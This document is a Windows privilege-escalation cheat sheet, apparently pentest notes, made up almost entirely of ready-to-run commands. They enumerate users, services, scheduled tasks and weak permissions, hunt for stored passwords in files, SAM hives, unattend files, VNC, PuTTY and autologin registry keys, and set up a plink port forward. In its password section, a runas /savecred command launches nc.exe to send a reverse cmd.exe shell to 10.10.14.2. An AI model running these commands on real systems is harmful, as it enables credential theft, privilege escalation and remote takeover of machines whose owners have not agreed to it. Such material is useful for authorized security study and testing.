# Windows Privilege Escalation

### patch level  
systeminfo  
wmic qfe get Caption,Description,HotFixID,InstalledOn  

whoami  
echo %USERNAME%  

net user  
net localgroup  

users in a domain  
net user /domain  

net group /domain  
net group /domain <Group Name>  

### Firewall  
netsh firewall show state  
netsh firewall show config  

### Network  
ipconfig /all  
route print  
arp -A  

### Scheduled Tasks  
schtasks /query /fo LIST /v  
--copy output and save in txt  
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  

dir %SystemRoot%\Tasks  

e.g. c:\windows\tasks\  
e.g. c:\windows\system32\tasks\  

### Weak Service Permissions  
Check service config can be modify or not  

accesschk.exe /accepteula  
accesschk.exe -uwcqv "Authenticated Users" * /accepteula  
accesschk.exe -ucqv \<Service Name>  

sc qc \<Service Name> -- Get service details  

Check service with weak file permission  
User c:\windows\temp\  

wmic.exe  
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  

sc.exe  
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  
type Servicenames.txt  
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  

### Unquoted Service Path  
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  

sc query  
sc qc service name  

### AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  

### Service only available from inside  
netstat -ano  
upload plink.exe  

plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"

### Pasword in files  
https://pentestlab.blog/tag/privilege-escalation/page/3/  
cmdkey /list        << If there are entries, it means that we may able to runas certain user who stored his cred in windows  
runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  

Can we find any SAM files?  
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  

findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
findstr /si pass/pwd *.ini  

dir /s *pass* == *cred* == *vnc* == *.config*  

in all files  
findstr /spin "password" *.*  
findstr /spin "password" *.*  

Unattended? vnc?  
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  

dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  

### VNC  
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  

### Windows autologin  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

### SNMP Paramters  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

### Putty  
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  

### Search for password in registry  
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  







